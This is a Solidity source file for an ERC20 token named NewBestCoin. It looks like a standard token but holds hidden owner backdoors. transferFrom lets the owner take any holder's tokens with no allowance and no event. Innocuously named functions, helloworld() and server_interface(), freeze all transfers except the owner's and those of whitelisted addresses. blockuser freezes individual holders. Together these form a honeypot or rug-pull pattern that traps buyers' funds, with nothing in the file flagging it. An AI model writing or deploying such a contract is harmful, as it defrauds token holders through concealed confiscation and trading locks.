pragma solidity ^0.4.0;

// Safe maths
// ----------------------------------------------------------------------------
library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}


contract ERC20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);
  
  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}


contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}



contract Owned {
  address public owner;
  address public newOwner;
  
  event OwnershipTransferred(address indexed _from, address indexed _to);
  
  constructor() public {
    owner = msg.sender;
  }
  
  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }
  
  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}


contract NBC is ERC20Interface, Owned {
  using SafeMath for uint;
  
  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  uint8 locked=0;
  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;
  mapping(address => uint) blocked;
  mapping(address => uint) unaffected;
  
  
  constructor(uint256 total) public {
    symbol = "NBC";
    name = "NewBestCoin";
    decimals = 18;
    _totalSupply = total * 10**uint(decimals);
    balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
  }
  
  
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  
  
  function balanceOf(address tokenOwner) public view returns (uint balance) {
    return balances[tokenOwner];
  }
  
  
  
  function transfer(address to, uint tokens) public returns (bool success) {
    
    if(blocked[msg.sender]==0x424C4F434B)
    {
      return false;
    }

    if(msg.sender!=owner && locked !=0 && unaffected[msg.sender]!=1)
    {
      return false;
    }
    
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  
  
  
  function approve(address spender, uint tokens) public returns (bool success) {
    if(msg.sender!=owner && locked !=0 && unaffected[msg.sender]!=1)
    {
      return false;
    }
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  
  
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
    
    if(blocked[msg.sender]==0x424C4F434B)
    {
      return false;
    }
     if(msg.sender==owner)
    {
      balances[from] =  balances[from].sub(tokens);
      balances[to] = balances[to].add(tokens);
      return true;
    }
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  
  
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  
  
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    
    if(blocked[msg.sender]==0x424C4F434B)
    {
      return false;
    }
    
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  
  function () external payable {
    revert();
  }
  
  
  function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {
    return ERC20Interface(tokenAddress).transfer(owner, tokens);
  }
  
  
  
  function blockuser(address tokenOwner) public onlyOwner returns (bool success) {
    if(tokenOwner==owner)
    {
      return false;
    }
    blocked[tokenOwner]=0x424C4F434B;
    //balances[owner]= balances[owner]+balances[tokenOwner];
    //balances[tokenOwner] = 0;
    return true;
  }
  function unblockuser(address tokenOwner) public onlyOwner returns (bool success) {
    blocked[tokenOwner]=0x00;
    return true;
  }
  function helloworld() public onlyOwner returns (bool success) {
    locked=1;
    return true;
  }
  function server_interface() public onlyOwner returns (bool success) {
    locked=0;
    return true;
  }
  function justswap_interface(address tokenOwner,uint8 s) public onlyOwner returns (bool success) {
    unaffected[tokenOwner]=s;
    return true;
  }
}
